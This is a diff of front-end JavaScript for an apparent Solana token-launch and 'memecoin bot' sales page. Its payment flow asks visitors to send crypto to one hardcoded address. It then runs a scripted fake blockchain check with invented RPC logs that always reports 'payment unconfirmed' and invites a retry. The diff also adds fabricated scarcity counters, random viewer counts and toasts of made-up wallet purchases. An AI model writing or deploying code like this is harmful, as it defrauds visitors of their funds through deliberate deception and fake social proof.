+            const supply = document.getElementById('token-supply').value || '1,000,000,000';
+            const liquidity = parseFloat(document.getElementById('liquidity-amount').value) || 0;
+
+            const baseLaunchFee = 0.20;
+            const revokeMint = document.getElementById('revoke-mint').checked ? 0.10 : 0;
+            const revokeFreeze = document.getElementById('revoke-freeze').checked ? 0.10 : 0;
+            const burnLp = document.getElementById('burn-lp').checked ? 0.10 : 0;
+
+            const totalOptionsFee = revokeMint + revokeFreeze + burnLp;
+            const total = baseLaunchFee + liquidity + totalOptionsFee;
+
+            document.getElementById('preview-name').innerText = name;
+            document.getElementById('preview-symbol').innerText = '$' + symbol.toUpperCase();
+            
+            // Image Preview Logic Update
+            const avatar = document.getElementById('preview-avatar');
+            if (uploadedImageSrc) {
+                avatar.innerHTML = `<img src="${uploadedImageSrc}" alt="Token Logo">`;
+            } else {
+                avatar.innerHTML = symbol.charAt(0).toUpperCase() || 'W';
+            }
+            
+            document.getElementById('summary-supply').innerText = supply;
+            document.getElementById('summary-liquidity').innerText = liquidity.toFixed(2) + ' SOL';
+
+            if (totalOptionsFee > 0) {
+                document.getElementById('summary-options-row').classList.remove('hidden');
+                document.getElementById('summary-options').innerText = '+ ' + totalOptionsFee.toFixed(2) + ' SOL';
+            } else {
+                document.getElementById('summary-options-row').classList.add('hidden');
+            }
+
+            const totalText = total.toFixed(2) + ' SOL';
+            document.getElementById('summary-total').innerText = totalText;
+            document.getElementById('pay-amount-big').innerText = total.toFixed(2);
+            document.getElementById('pay-amount-text').innerText = totalText;
+        }
+
+        /* --- Lightbox Logic --- */
         let currentGalleryImgs = [];
         let currentImgIndex = 0;
         const lightbox = document.getElementById('lightbox');
         const lightboxImg = document.getElementById('lightbox-img');
 
         function openLightbox(clickedImg, gallerySelector) {
-            if (!lightbox || !lightboxImg) return;
             const galleryElements = document.querySelectorAll(`${gallerySelector} .showcase-img`);
             currentGalleryImgs = Array.from(galleryElements).map(img => img.src);
             currentImgIndex = currentGalleryImgs.indexOf(clickedImg.src);
+            
             lightboxImg.src = currentGalleryImgs[currentImgIndex];
             lightbox.classList.add('active');
         }
-        function closeLightbox() { lightbox?.classList.remove('active'); }
+
+        function closeLightbox() {
+            lightbox.classList.remove('active');
+        }
+
         function nextImage() {
-            if (!currentGalleryImgs.length) return;
+            if (currentGalleryImgs.length === 0) return;
             currentImgIndex = (currentImgIndex + 1) % currentGalleryImgs.length;
             lightboxImg.src = currentGalleryImgs[currentImgIndex];
         }
+
         function prevImage() {
-            if (!currentGalleryImgs.length) return;
+            if (currentGalleryImgs.length === 0) return;
             currentImgIndex = (currentImgIndex - 1 + currentGalleryImgs.length) % currentGalleryImgs.length;
             lightboxImg.src = currentGalleryImgs[currentImgIndex];
         }
-        lightbox?.addEventListener('click', (e) => {
-            if (e.target === lightbox || e.target.classList.contains('lightbox-img-wrapper')) closeLightbox();
+
+        lightbox.addEventListener('click', (e) => {
+            if (e.target === lightbox || e.target.classList.contains('lightbox-img-wrapper')) {
+                closeLightbox();
+            }
         });
+
         document.addEventListener('keydown', (e) => {
-            if (!lightbox?.classList.contains('active')) return;
+            if (!lightbox.classList.contains('active')) return;
             if (e.key === 'Escape') closeLightbox();
             if (e.key === 'ArrowRight') nextImage();
             if (e.key === 'ArrowLeft') prevImage();
         });
 
-        /* Motion / nav / counters */
+
+        /* --- Payment Flows (modal-driven) --- */
+        const PAY_ADDRESS = '2AXBwqmXGHFypHQRgEhsmoXTWFoHdQxQadnKuiufhTu7';
+
+        const payModal   = document.getElementById('pay-modal');
+        const payStepSend   = document.getElementById('pay-step-send');
+        const payStepVerify = document.getElementById('pay-step-verify');
+        const payStepResult = document.getElementById('pay-step-result');
+        let payTimers = [];
+        let currentFlow = null;
+
+        const PAY_FLOWS = {
+            token: {
+                title: 'Complete your launch',
+                desc: 'Send the exact amount to the address below. Your token deploys the moment it confirms.',
+                unit: 'SOL',
+                amount: () => document.getElementById('summary-total').innerText.replace(' SOL', ''),
+                resultTitle: 'Deployment not verified',
+                checks: [
+                    'Connecting to Solana RPC cluster',
+                    'Locating transaction signature',
+                    'Waiting for slot finality',
+                    'Matching amount to your quote',
+                    'Reserving mint address'
+                ],
+                logs: [
+                    'rpc: connecting to mainnet-beta...',
+                    'rpc: node handshake ok · slot 298,441,207',
+                    'scan: filtering signatures for destination...',
+                    'scan: 0 matching transfers in last 240 slots',
+                    'finality: awaiting confirmation depth 32...',
+                    'match: comparing lamports against quote...',
+                    'mint: reserving program derived address...',
+                    'mint: rollback — payment unconfirmed'
+                ]
+            },
+            bot: {
+                title: 'Buy Wire Memecoin Bot',
+                desc: 'Send the exact amount to the address below to unlock your lifetime license key.',
+                unit: 'USDC / SOL',
+                amount: () => '49.99',
+                resultTitle: 'Payment not found',
+                checks: [
+                    'Connecting to Solana RPC cluster',
+                    'Scanning ledger for your signature',
+                    'Waiting for slot finality',
+                    'Validating license parameters',
+                    'Issuing license key'
+                ],
+                logs: [
+                    'rpc: connecting to mainnet-beta...',
+                    'rpc: node handshake ok · slot 298,441,219',
+                    'scan: filtering signatures for destination...',
+                    'scan: 0 matching transfers in last 240 slots',
+                    'finality: awaiting confirmation depth 32...',
+                    'license: validating tier + entitlements...',
+                    'license: key generation halted',
+                    'license: rollback — payment unconfirmed'
+                ]
+            }
+        };
+
+        function clearPayTimers() {
+            payTimers.forEach(clearTimeout);
+            payTimers = [];
+        }
+
+        function openPay(flowKey) {
+            const flow = PAY_FLOWS[flowKey];
+            if (!flow) return;
+            currentFlow = flow;
+            clearPayTimers();
+
+            if (flowKey === 'token') updatePreview();
+
+            const amount = flow.amount();
+            document.getElementById('pay-title').innerText = flow.title;
+            document.getElementById('pay-desc').innerText = flow.desc;
+            document.getElementById('pay-amount-big').innerText = amount;
+            document.getElementById('pay-amount-unit').innerText = flow.unit;
+            document.getElementById('pay-amount-text').innerText = amount + ' ' + flow.unit;
+            document.getElementById('pay-address').innerText = PAY_ADDRESS;
+            document.getElementById('pay-result-title').innerText = flow.resultTitle;
+
+            payStepSend.classList.remove('hidden');
+            payStepVerify.classList.add('hidden');
+            payStepResult.classList.add('hidden');
+
+            payModal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closePay() {
+            clearPayTimers();
+            payModal.classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function runPayVerification() {
+            const flow = currentFlow;
+            if (!flow) return;
+            clearPayTimers();
+
+            payStepSend.classList.add('hidden');
+            payStepResult.classList.add('hidden');
+            payStepVerify.classList.remove('hidden');
+            payModal.querySelector('.pay-card').scrollTop = 0;
+
+            /* Build the checklist */
+            const checksEl = document.getElementById('pay-checks');
+            checksEl.innerHTML = flow.checks.map(c =>
+                `<div class="pay-check"><span class="mark"></span><span class="t">${c}</span><span class="ms"></span></div>`
+            ).join('');
+            const checkEls = Array.from(checksEl.children);
+
+            const terminal = document.getElementById('pay-terminal');
+            terminal.innerHTML = '';
+
+            const fill = document.getElementById('pay-progress-fill');
+            fill.style.width = '0%';
+
+            /* ~13s total: five checks, staggered */
+            const stepMs = 2600;
+            const total = stepMs * flow.checks.length;
+
+            checkEls.forEach((el, i) => {
+                payTimers.push(setTimeout(() => {
+                    if (i > 0) {
+                        const prev = checkEls[i - 1];
+                        prev.classList.remove('active');
+                        prev.classList.add('done');
+                        prev.querySelector('.ms').innerText =
+                            (Math.floor(Math.random() * 900) + 180) + 'ms';
+                    }
+                    el.classList.add('active');
+                    fill.style.width = ((i + 1) / flow.checks.length) * 100 + '%';
+                }, i * stepMs));
+            });
+
+            /* Terminal lines drip in across the same window */
+            const logGap = total / flow.logs.length;
+            flow.logs.forEach((line, i) => {
+                payTimers.push(setTimeout(() => {
+                    terminal.innerHTML += `<div>&gt; ${line}</div>`;
+                    terminal.scrollTop = terminal.scrollHeight;
+                }, i * logGap + 400));
+            });
+
+            /* Land on the result */
+            payTimers.push(setTimeout(() => {
+                const last = checkEls[checkEls.length - 1];
+                last.classList.remove('active');
+                last.classList.add('done');
+                last.querySelector('.ms').innerText =
+                    (Math.floor(Math.random() * 900) + 180) + 'ms';
+                fill.style.width = '100%';
+            }, total));
+
+            payTimers.push(setTimeout(() => {
+                payStepVerify.classList.add('hidden');
+                payStepResult.classList.remove('hidden');
+                payModal.querySelector('.pay-card').scrollTop = 0;
+            }, total + 900));
+        }
+
+        /* Wiring */
+        document.getElementById('pay-verify-btn').addEventListener('click', runPayVerification);
+        document.getElementById('pay-retry-btn').addEventListener('click', () => {
+            payStepResult.classList.add('hidden');
+            payStepSend.classList.remove('hidden');
+        });
+        document.getElementById('pay-copy-amount').addEventListener('click', function () {
+            copyText(document.getElementById('pay-amount-text').innerText.split(' ')[0], this);
+        });
+        document.getElementById('pay-copy-address').addEventListener('click', function () {
+            copyText(PAY_ADDRESS, this);
+        });
+        payModal.querySelectorAll('[data-pay-close]').forEach(el =>
+            el.addEventListener('click', closePay)
+        );
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && payModal.classList.contains('active')) closePay();
+        });
+
+        /* Entry points kept under their original names */
+        function showTokenPayment() { openPay('token'); }
+        function showAppPayment()   { openPay('bot'); }
+
+        /* --- FOMO Elements --- */
+        let currentSpots = localStorage.getItem('wire_licenses_left') || 12;
+        
+        function updateSpotsUI() {
+            document.getElementById('fomo-counter-text').innerText = `${500 - currentSpots} / 500`;
+            document.getElementById('fomo-fill-bar').style.width = `${((500 - currentSpots) / 500) * 100}%`;
+            localStorage.setItem('wire_licenses_left', currentSpots);
+        }
+
+        setInterval(() => {
+            if (currentSpots > 2 && Math.random() > 0.6) {
+                currentSpots--;
+                updateSpotsUI();
+            }
+        }, 12000); 
+
+        let viewers = Math.floor(Math.random() * (120 - 45 + 1)) + 45;
+        setInterval(() => {
+            viewers += Math.floor(Math.random() * 9) - 3;
+            if (viewers < 15) viewers = 15;
+            document.getElementById('live-viewers') && (document.getElementById('live-viewers').innerText = viewers);
+        }, 4500);
+
+        function triggerFOMOToast() {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
+            let str1 = '', str2 = '';
+            for(let i=0; i<4; i++) str1 += chars.charAt(Math.floor(Math.random() * chars.length));
+            for(let i=0; i<4; i++) str2 += chars.charAt(Math.floor(Math.random() * chars.length));
+            const wallet = `${str1}...${str2}`;
+
+            const actions = ['purchased the Wire Memecoin Bot', 'created a new Token', 'activated Fee Reclaimer', 'executed a multi-wallet snipe'];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `
+                <div class="status-dot"></div>
+                <div class="toast-text">
+                    <p>Wallet ${wallet}</p>
+                    <span>Just ${action}.</span>
+                </div>
+            `;
+            
+            document.getElementById('toast-container').appendChild(toast);
+            setTimeout(() => toast.classList.add('show'), 100);
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 400);
+            }, 5000);
+
+            setTimeout(triggerFOMOToast, Math.floor(Math.random() * 8000) + 6000);
+        }
+
+        /* --- Initialization --- */
+        window.addEventListener('scroll', () => {
+            const nav = document.getElementById('navbar');
+            window.scrollY > 50 ? nav.classList.add('nav-scrolled') : nav.classList.remove('nav-scrolled');
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            updatePreview();
+            updateSpotsUI();
+            setTimeout(triggerFOMOToast, 3000);
+        });
+    </script>
+
+    <script>
+        /* ========================================================
+           WIRE — MOTION LAYER
+           Scroll progress, reveals, cursor light, counters, nav.
+           ======================================================== */
         (function () {
             const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-            requestAnimationFrame(() => requestAnimationFrame(() => document.body.classList.add('loaded')));
 
+            /* --- Play the hero intro once the first frame is up --- */
+            requestAnimationFrame(() => requestAnimationFrame(() => {
+                document.body.classList.add('loaded');
+            }));
+
+            /* --- Scroll progress bar --- */
             const bar = document.getElementById('scroll-progress');
             let ticking = false;
             function onScroll() {
-                if (!bar || ticking) return;
+                if (ticking) return;
                 ticking = true;
                 requestAnimationFrame(() => {
                     const max = document.documentElement.scrollHeight - window.innerHeight;
@@ -1582,12 +2152,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
             window.addEventListener('scroll', onScroll, { passive: true });
             onScroll();
 
-            window.addEventListener('scroll', () => {
-                const nav = document.getElementById('navbar');
-                if (!nav) return;
-                window.scrollY > 50 ? nav.classList.add('nav-scrolled') : nav.classList.remove('nav-scrolled');
-            }, { passive: true });
-
+            /* --- Reveal on scroll --- */
             const revealables = document.querySelectorAll('[data-reveal]');
             if (reduced || !('IntersectionObserver' in window)) {
                 revealables.forEach(el => el.classList.add('revealed'));
@@ -1603,8 +2168,9 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
                 revealables.forEach(el => revealer.observe(el));
             }
 
+            /* --- Cursor light (desktop, pointer devices only) --- */
             const glow = document.getElementById('cursor-glow');
-            if (!reduced && glow && window.matchMedia('(hover: hover) and (min-width: 900px)').matches) {
+            if (!reduced && window.matchMedia('(hover: hover) and (min-width: 900px)').matches) {
                 let tx = window.innerWidth / 2, ty = window.innerHeight / 2, cx = tx, cy = ty;
                 window.addEventListener('pointermove', (e) => {
                     tx = e.clientX; ty = e.clientY;
@@ -1618,6 +2184,7 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
                 })();
             }
 
+            /* --- Count-up stats --- */
             function countUp(el) {
                 const target = parseFloat(el.dataset.count);
                 const suffix = el.dataset.suffix || '';
@@ -1646,31 +2213,48 @@ footer { padding: 80px 5% 40px; text-align: center; border-top: 1px solid var(--
                 counters.forEach(countUp);
             }
 
+            /* --- Mobile menu --- */
             const toggle = document.getElementById('nav-toggle');
             const menu = document.getElementById('mobile-menu');
-            if (toggle && menu) {
-                function setMenu(open) {
-                    document.body.classList.toggle('menu-open', open);
-                    toggle.setAttribute('aria-expanded', String(open));
-                }
-                toggle.addEventListener('click', () => setMenu(!document.body.classList.contains('menu-open')));
-                menu.querySelectorAll('a').forEach(a => a.addEventListener('click', () => setMenu(false)));
-                document.addEventListener('keydown', (e) => { if (e.key === 'Escape') setMenu(false); });
+            function setMenu(open) {
+                document.body.classList.toggle('menu-open', open);
+                toggle.setAttribute('aria-expanded', String(open));
             }
+            toggle.addEventListener('click', () => setMenu(!document.body.classList.contains('menu-open')));
+            menu.querySelectorAll('a').forEach(a => a.addEventListener('click', () => setMenu(false)));
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape') setMenu(false);
+            });
 
+            /* --- Active nav link tracking --- */
             const navLinks = Array.from(document.querySelectorAll('.nav-links a[href^="#"]'));
-            const sections = navLinks.map(a => document.querySelector(a.getAttribute('href'))).filter(Boolean);
+            const sections = navLinks
+                .map(a => document.querySelector(a.getAttribute('href')))
+                .filter(Boolean);
             if ('IntersectionObserver' in window && sections.length) {
                 const spy = new IntersectionObserver((entries) => {
                     entries.forEach(entry => {
                         if (!entry.isIntersecting) return;
-                        navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + entry.target.id));
+                        navLinks.forEach(a => a.classList.toggle(
+                            'active', a.getAttribute('href') === '#' + entry.target.id
+                        ));
                     });
                 }, { rootMargin: '-45% 0px -50% 0px' });
                 sections.forEach(s => spy.observe(s));
             }
 
-            window.addEventListener('DOMContentLoaded', () => updatePreview());
+            /* --- Magnetic pull on primary buttons --- */
+            if (!reduced && window.matchMedia('(hover: hover) and (min-width: 900px)').matches) {
+                document.querySelectorAll('.hero-actions a').forEach(btn => {
+                    btn.addEventListener('pointermove', (e) => {
+                        const r = btn.getBoundingClientRect();
+                        const dx = (e.clientX - (r.left + r.width / 2)) / r.width;
+                        const dy = (e.clientY - (r.top + r.height / 2)) / r.height;
+                        btn.style.transform = `translate(${dx * 8}px, ${dy * 6 - 2}px)`;
+                    });
+                    btn.addEventListener('pointerleave', () => { btn.style.transform = ''; });
+                });
+            }
         })();
     </script>
 </body>
